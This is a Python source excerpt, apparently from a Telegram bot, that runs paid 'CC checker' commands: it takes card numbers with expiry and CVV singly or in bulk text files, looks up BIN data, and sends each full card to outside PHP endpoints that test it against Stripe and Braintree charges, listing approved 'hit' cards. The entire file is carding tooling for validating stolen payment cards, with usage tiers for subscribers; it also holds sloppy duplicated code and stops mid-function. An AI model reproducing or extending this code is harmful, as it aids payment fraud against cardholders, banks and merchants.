    reply_message = (
        f"<b>Braintree 1$ [ /br ]</b>\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                f"カ <b>Card:</b> <code>{cc}</code>\n"  # Display the card from the user's input
        f"<b>Message ➜ {api_response}</b>\n"  # Display the entire API response
        f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
        f"<b>Type:</b> ➜ {card_type}\n"
        f"<b>Level:</b> ➜ {brand}\n"
        f"<b>Bank:</b> ➜ {bank_name}\n"
        f"<b>Country:</b> ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"<b>Time:</b> ➜ {elapsed_seconds}\n"  # Now correctly referencing the variable
        f"<b>Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]</b>\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    # Edit the initial message with the final reply
    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None  # Return None if the request fails
    except Exception as e:
        print(f"Error fetching bin data: {e}")
        return None  # Return None if there's an exception

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"  # Return a generic error message
        
    
#mass Stripe 9£

@app.on_message(command_with_mention("mxvv"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_check_stripe_five(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file containing CCs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("⚠️ <b>The file must be a .txt file containing CCs.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await client.download_media(document)
    with open(file_path, "r") as file:
        ccs = file.read().splitlines()

    total_ccs = len(ccs)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free' and total_ccs > 50:
        await message.reply("⚠️ <b>Free users can only check up to 50 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return
    elif plan == 'Plus' and total_ccs > 200:
        await message.reply("⚠️ <b>Plus users can only check up to 200 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return

    hits = 0
    declined = 0
    hit_cards = []

    progress_message = await message.reply(
        f"🛠️ <b>Mass XVV check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> 0\n"
        f"✅ <b>Hits:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏳ <b>Left:</b> {total_ccs}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    checked_ccs = 0
    left_ccs = total_ccs
    last_edit_time = time.time()

    async with aiohttp.ClientSession() as session:
        for cc in ccs:
            start_time = time.time()
            
            # Fetch BIN info
            bin_info_url = f"https://bins.antipublic.cc/bins/{cc[:6]}" 
            try:
                async with session.get(bin_info_url) as response:
                    bin_data = await response.json()
                    bank = bin_data.get("bank", "Unknown")
                    country = bin_data.get("country_name", "Unknown")
                    bin_info = f"Brand: {bin_data.get('brand', 'Unknown')}, Type: {bin_data.get('type', 'Unknown')}, Level: {bin_data.get('level', 'Unknown')}" 
            except aiohttp.ClientError:
                bank = "Unknown"
                country = "Unknown"
                bin_info = "Unknown"

            # Check Stripe API
            api_url = f"https://xronak.whf.bz/r25.php?lista={cc}"
            try:
                async with session.get(api_url) as response:
                    api_response = await response.text()  # Get the response as text
                    elapsed_time = time.time() - start_time
                    elapsed_seconds = f"{elapsed_time:.2f} seconds"

                    Status = ""  # Initialize Status
                    if "✅" in api_response:
                        Status = "Approved ✅"
                        hits += 1
                        # Fetch card directly from the cc variable (not API response)
                        card = cc  
                        hit_cards.append(card)

                        reply_message = (
                            f"<b>STRIPE 25$ [ /mxvv ]</b>\n"
                            f"{Status}\n"  # Use the Status variable
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                            f"カ <b>Card:</b> <code>{card}</code>\n"
                            f"<b>Message ➜ {api_response}</b>\n"  # Display the API response
                            f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                            f"<b>Bank:</b> ➜ {bank}\n"
                            f"<b>Country:</b> ➜ {country}\n"
                            f"<b>Bin Info:</b> ➜ {bin_info}\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                            f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                            f"<b>Req by ➜ @{message.from_user.username}</b>\n"
                            f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                        )

                        await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
                    else:
                        declined += 1
            except aiohttp.ClientError:
                pass

            checked_ccs += 1
            left_ccs -= 1

            # Update progress message every 5 seconds
            if time.time() - last_edit_time >= 5:
                await progress_message.edit(
                    f"🛠️ <b>Mass XVV check in progress:</b>\n\n"
                    f"👤 <b>User:</b> @{message.from_user.username}\n"
                    f"🔄 <b>Checked:</b> {checked_ccs}\n"
                    f"✅ <b>Hits:</b> {hits}\n"
                    f"❌ <b>Declined:</b> {declined}\n"
                    f"⏳ <b>Left:</b> {left_ccs}",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True
                )
                last_edit_time = time.time()

    await progress_message.delete()

    result_message = (
        f"🎉 <b>Mass XVV check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
    )

    if hits > 0:
        result_message += f"\n<b>Hit Cards:</b>\n" + "\n".join([f"➜ <code>{card}</code>" for card in hit_cards])

    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    os.remove(file_path)
    
                             
#stripe vbv    

@app.on_message(command_with_mention("sb"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/sb cc|month|year|cvv</code>\n<b>┬╗ Gateway:</b> Stripe vbv 🪽<b>\n┬╗ Status:</b> Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]  # Get the CC from the user's command
    start_time = time.time()

    # Fetch bin data from antipublic.cc with retries
    bin_data = await fetch_bin_data(cc[:6])

    # Prepare default values for bin data in case of error
    scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
    card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
    brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
    bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
    country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
    country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
    currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

    # API call to xronak.whf.bz (replace with your actual API)
    api_url = f"http://igniteop.com/sexy-api/sb3.php?lista={cc}" 

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('<b>🍳 Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    # Process the single API request
    api_response = await fetch_api_data(api_url)

    # Determine status based on emoji
    status = ""
    if "✅" in api_response:
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif "❌" in api_response:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    elif "⚠️" in api_response:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    # Calculate the time taken
    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"  # Calculate elapsed_seconds here

    # Format the final reply message 
    reply_message = (
        f"<b>STRIPE VBV [ /sb ]</b>\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                f"カ <b>Card:</b> <code>{cc}</code>\n"  # Display the card from the user's input
        f"<b>Message ➜ {api_response}</b>\n"  # Display the entire API response
        f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
        f"<b>Type:</b> ➜ {card_type}\n"
        f"<b>Level:</b> ➜ {brand}\n"
        f"<b>Bank:</b> ➜ {bank_name}\n"
        f"<b>Country:</b> ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"<b>Time:</b> ➜ {elapsed_seconds}\n"  # Now correctly referencing the variable
        f"<b>Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]</b>\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    # Edit the initial message with the final reply
    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None  # Return None if the request fails
    except Exception as e:
        print(f"Error fetching bin data: {e}")
        return None  # Return None if there's an exception

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"  # Return a generic error message

    
#mass Braintree 1$

@app.on_message(command_with_mention("mbr"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_check_stripe_five(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file containing CCs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("⚠️ <b>The file must be a .txt file containing CCs.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await client.download_media(document)
    with open(file_path, "r") as file:
        ccs = file.read().splitlines()

    total_ccs = len(ccs)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free' and total_ccs > 50:
        await message.reply("⚠️ <b>Free users can only check up to 50 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return
    elif plan == 'Plus' and total_ccs > 100:
        await message.reply("⚠️ <b>Plus users can only check up to 100 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return

    hits = 0
    declined = 0
    hit_cards = []

    progress_message = await message.reply(
        f"🛠️ <b>Mass SS check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> 0\n"
        f"✅ <b>Hits:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏳ <b>Left:</b> {total_ccs}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    checked_ccs = 0
    left_ccs = total_ccs
    last_edit_time = time.time()

    async with aiohttp.ClientSession() as session:
        for cc in ccs:
            start_time = time.time()
            
            # Fetch BIN info
            bin_info_url = f"https://bins.antipublic.cc/bins/{cc[:6]}" 
            try:
                async with session.get(bin_info_url) as response:
                    bin_data = await response.json()
                    bank = bin_data.get("bank", "Unknown")
                    country = bin_data.get("country_name", "Unknown")
                    bin_info = f"Brand: {bin_data.get('brand', 'Unknown')}, Type: {bin_data.get('type', 'Unknown')}, Level: {bin_data.get('level', 'Unknown')}" 
            except aiohttp.ClientError:
                bank = "Unknown"
                country = "Unknown"
                bin_info = "Unknown"

            # Check Stripe API
            api_url = f"http://xronak.site/c3.php?lista={cc}"
            try:
                async with session.get(api_url) as response:
                    api_response = await response.text()  # Get the response as text
                    elapsed_time = time.time() - start_time
                    elapsed_seconds = f"{elapsed_time:.2f} seconds"

                    Status = ""  # Initialize Status
                    if "✅" in api_response:
                        Status = "Approved ✅"
                        hits += 1
                        # Fetch card directly from the cc variable (not API response)
                        card = cc  
                        hit_cards.append(card)

                        reply_message = (
                            f"<b>Braintree 1$ [ /mbr ]</b>\n"
                            f"{Status}\n"  # Use the Status variable
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                            f"カ <b>Card:</b> <code>{card}</code>\n"
                            f"<b>Message ➜ {api_response}</b>\n"  # Display the API response
                            f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                            f"<b>Bank:</b> ➜ {bank}\n"
                            f"<b>Country:</b> ➜ {country}\n"
                            f"<b>Bin Info:</b> ➜ {bin_info}\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                            f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                            f"<b>Req by ➜ @{message.from_user.username}</b>\n"
                            f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                        )

                        await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
                    else:
                        declined += 1
            except aiohttp.ClientError:
                pass

            checked_ccs += 1
            left_ccs -= 1

            # Update progress message every 5 seconds
            if time.time() - last_edit_time >= 5:
                await progress_message.edit(
                    f"🛠️ <b>Mass BR check in progress:</b>\n\n"
                    f"👤 <b>User:</b> @{message.from_user.username}\n"
                    f"🔄 <b>Checked:</b> {checked_ccs}\n"
                    f"✅ <b>Hits:</b> {hits}\n"
                    f"❌ <b>Declined:</b> {declined}\n"
                    f"⏳ <b>Left:</b> {left_ccs}",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True
                )
                last_edit_time = time.time()

    await progress_message.delete()

    result_message = (
        f"🎉 <b>Mass BR check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
    )

    if hits > 0:
        result_message += f"\n<b>Hit Cards:</b>\n" + "\n".join([f"➜ <code>{card}</code>" for card in hit_cards])

    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    os.remove(file_path)
    
#stripe 8$    

@app.on_message(command_with_mention("st"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/st cc|month|year|cvv</code>\n<b>┬╗ Gateway:</b> Stripe 8$ 🪽<b>\n┬╗ Status:</b> Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]  # Get the CC from the user's command
    start_time = time.time()

    # Fetch bin data from antipublic.cc with retries
    bin_data = await fetch_bin_data(cc[:6])

    # Prepare default values for bin data in case of error
    scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
    card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
    brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
    bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
    country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
    country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
    currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

    # API call to xronak.whf.bz (replace with your actual API)
    api_url = f"http://xronak.site/k8.php?lista={cc}" 

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('<b>🍳 Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    # Process the single API request
    api_response = await fetch_api_data(api_url)

    # Determine status based on emoji
    status = ""
    if "✅" in api_response:
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif "❌" in api_response:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    elif "⚠️" in api_response:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    # Calculate the time taken
    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"  # Calculate elapsed_seconds here

    # Format the final reply message 
    reply_message = (
        f"<b>STRIPE 8$ [ /st ]</b>\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                f"カ <b>Card:</b> <code>{cc}</code>\n"  # Display the card from the user's input
        f"<b>Message ➜ {api_response}</b>\n"  # Display the entire API response
        f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
        f"<b>Type:</b> ➜ {card_type}\n"
        f"<b>Level:</b> ➜ {brand}\n"
        f"<b>Bank:</b> ➜ {bank_name}\n"
        f"<b>Country:</b> ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"<b>Time:</b> ➜ {elapsed_seconds}\n"  # Now correctly referencing the variable
        f"<b>Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]</b>\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    # Edit the initial message with the final reply
    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None  # Return None if the request fails
    except Exception as e:
        print(f"Error fetching bin data: {e}")
        return None  # Return None if there's an exception

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"  # Return a generic error message
        
#Mass Stripe 8$

@app.on_message(command_with_mention("mst"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    user_plan = user_info.get('plan', 'Free')

    # Define limits based on plan
    max_checks = 5 if user_plan == 'Free' else 10

    if len(message_text) <= 1:
        await message.reply(
            '⚠️ <b>Usage:</b> <code>/mst cc1 cc2 cc3 ...</code> (max. {} checks)\n<b>┬╗ Gateway:</b>Mass Stripe 8$ 🪽<b>\n┬╗ Status:</b> Active ✅'.format(max_checks),
            parse_mode=enums.ParseMode.HTML
        )
        return

    ccs = message_text[1:]
    if len(ccs) > max_checks:
        await message.reply(
            f'⚠️ You can check a maximum of {max_checks} CCs at once with your plan.',
            parse_mode=enums.ParseMode.HTML
        )
        return

    # Send initial reply
    reply_message = await message.reply(
        "<b>Stripe 8$ [ /mst ]</b>\n"
        "<b>Cooking Something Good....!🍷</b>", 
        parse_mode=enums.ParseMode.HTML
    )

    checked_ccs = 0
    hits = 0
    declined = 0
    hit_ccs = []  # To store CCs that were approved
    declined_ccs = []  # To store CCs that were declined
    
    # Motivational words for the reply message
    motivation_words = [
        "Keep going, you've got this!",
        "Never give up on your dreams!",
        "Believe in yourself, you can achieve anything!",
        "You are stronger than you think",
        "Fear is a liar, take a chance",
        "Growth is painful, but worth it",
        "You are stronger than you think!",
        "Don't be afraid to take risks!",
        "Success is just around the corner!",
        "You are capable of great things!",
        "Every challenge is an opportunity to grow!",
        "You are a winner!"
    ]
    motivation_index = 0

    # Process CCs one by one and update the reply message
    for cc in ccs:
        start_time = time.time()
        api_url = f"http://xronak.site/k8.php?lista={cc}"  

        # Fetch API data
        api_response = await fetch_api_data(api_url)

        # Determine status based on emoji
        status = ""
        if "✅" in api_response:
            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            hits += 1
            hit_ccs.append(cc)
        elif "❌" in api_response:
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            declined += 1
            declined_ccs.append(cc)        
        elif "⚠️" in api_response:
            status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

        # Calculate the time taken
        elapsed_time = time.time() - start_time
        elapsed_seconds = f"{elapsed_time:.2f} seconds"  

        # Update the reply message by appending the result
        await reply_message.edit_text(
            reply_message.text + (
                f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                f"カ <b>Card:</b> <code>{cc}</code>\n" 
                f"<b>Message ➜ {api_response}</b>\n"
                f"<b>Status:</b> {status}\n"
                f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                f"⛈️ <b>: ({motivation_index+1}):</b> {motivation_words[motivation_index]}\n"  # Added Motivation index
            ),
            parse_mode=enums.ParseMode.HTML
        )

        checked_ccs += 1
        motivation_index += 1

    #  New UI for results
    result_message = (
        f"🎉 <b>Mass MST check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
        f"💳 <b>Approved CCs:</b>\n"
    )
    
    # Add approved CCs and their responses to the result message
    for cc, response in zip(hit_ccs, api_response):
        result_message += f"  - <code>{cc}</code> - {response}\n"
        
    #  New UI for results (continued)
    result_message += (
        f"💳 <b>Declined CCs:</b> {', '.join(declined_ccs)}\n" 
    )

    # Send the results message
    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    # Delete the initial reply message
    await reply_message.delete()

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"  # Return a generic error message                

#mass Stripe 8$

@app.on_message(command_with_mention("sttxt"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_check_stripe_five(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file containing CCs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("⚠️ <b>The file must be a .txt file containing CCs.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await client.download_media(document)
    with open(file_path, "r") as file:
        ccs = file.read().splitlines()

    total_ccs = len(ccs)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free' and total_ccs > 50:
        await message.reply("⚠️ <b>Free users can only check up to 50 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return
    elif plan == 'Plus' and total_ccs > 200:
        await message.reply("⚠️ <b>Plus users can only check up to 200 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return

    hits = 0
    declined = 0
    hit_cards = []

    progress_message = await message.reply(
        f"🛠️ <b>Mass ST check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> 0\n"
        f"✅ <b>Hits:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏳ <b>Left:</b> {total_ccs}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    checked_ccs = 0
    left_ccs = total_ccs
    last_edit_time = time.time()

    async with aiohttp.ClientSession() as session:
        for cc in ccs:
            start_time = time.time()
            
            # Fetch BIN info
            bin_info_url = f"https://bins.antipublic.cc/bins/{cc[:6]}" 
            try:
                async with session.get(bin_info_url) as response:
                    bin_data = await response.json()
                    bank = bin_data.get("bank", "Unknown")
                    country = bin_data.get("country_name", "Unknown")
                    bin_info = f"Brand: {bin_data.get('brand', 'Unknown')}, Type: {bin_data.get('type', 'Unknown')}, Level: {bin_data.get('level', 'Unknown')}" 
            except aiohttp.ClientError:
                bank = "Unknown"
                country = "Unknown"
                bin_info = "Unknown"

            # Check Stripe API
            api_url = f"http://xronak.site/k8.php?lista={cc}"
            try:
                async with session.get(api_url) as response:
                    api_response = await response.text()  # Get the response as text
                    elapsed_time = time.time() - start_time
                    elapsed_seconds = f"{elapsed_time:.2f} seconds"

                    Status = ""  # Initialize Status
                    if "✅" in api_response:
                        Status = "Approved ✅"
                        hits += 1
                        # Fetch card directly from the cc variable (not API response)
                        card = cc  
                        hit_cards.append(card)

                        reply_message = (
                            f"<b>STRIPE 8$ [ /mss ]</b>\n"
                            f"{Status}\n"  # Use the Status variable
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                            f"カ <b>Card:</b> <code>{card}</code>\n"
                            f"<b>Message ➜ {api_response}</b>\n"  # Display the API response
                            f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                            f"<b>Bank:</b> ➜ {bank}\n"
                            f"<b>Country:</b> ➜ {country}\n"
                            f"<b>Bin Info:</b> ➜ {bin_info}\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                            f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                            f"<b>Req by ➜ @{message.from_user.username}</b>\n"
                            f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                        )

                        await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
                    else:
                        declined += 1
            except aiohttp.ClientError:
                pass

            checked_ccs += 1
            left_ccs -= 1

            # Update progress message every 5 seconds
            if time.time() - last_edit_time >= 5:
                await progress_message.edit(
                    f"🛠️ <b>Mass ST check in progress:</b>\n\n"
                    f"👤 <b>User:</b> @{message.from_user.username}\n"
                    f"🔄 <b>Checked:</b> {checked_ccs}\n"
                    f"✅ <b>Hits:</b> {hits}\n"
                    f"❌ <b>Declined:</b> {declined}\n"
                    f"⏳ <b>Left:</b> {left_ccs}",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True
                )
                last_edit_time = time.time()

    await progress_message.delete()

    result_message = (
        f"🎉 <b>Mass ST check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
    )

    if hits > 0:
        result_message += f"\n<b>Hit Cards:</b>\n" + "\n".join([f"➜ <code>{card}</code>" for card in hit_cards])

    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    os.remove(file_path)
    
#stripe 6$    

@app.on_message(command_with_mention("stt"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/stt cc|month|year|cvv</code>\n<b>┬╗ Gateway:</b> Stripe 6$ 🪽<b>\n┬╗ Status:</b> Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]  # Get the CC from the user's command
    start_time = time.time()

    # Fetch bin data from antipublic.cc with retries
    bin_data = await fetch_bin_data(cc[:6])

    # Prepare default values for bin data in case of error
    scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
    card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
    brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
    bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
    country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
    country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
    currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

    # API call to xronak.whf.bz (replace with your actual API)
    api_url = f"http://xronak.site/k6.php?lista={cc}" 

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('<b>🍳 Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    # Process the single API request
    api_response = await fetch_api_data(api_url)

    # Determine status based on emoji
    status = ""
    if "✅" in api_response:
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif "❌" in api_response:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    elif "⚠️" in api_response:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    # Calculate the time taken
    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"  # Calculate elapsed_seconds here

    # Format the final reply message 
    reply_message = (
        f"<b>STRIPE 6$ [ /stt ]</b>\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                f"カ <b>Card:</b> <code>{cc}</code>\n"  # Display the card from the user's input
        f"<b>Message ➜ {api_response}</b>\n"  # Display the entire API response
        f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
        f"<b>Type:</b> ➜ {card_type}\n"
        f"<b>Level:</b> ➜ {brand}\n"
        f"<b>Bank:</b> ➜ {bank_name}\n"
        f"<b>Country:</b> ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
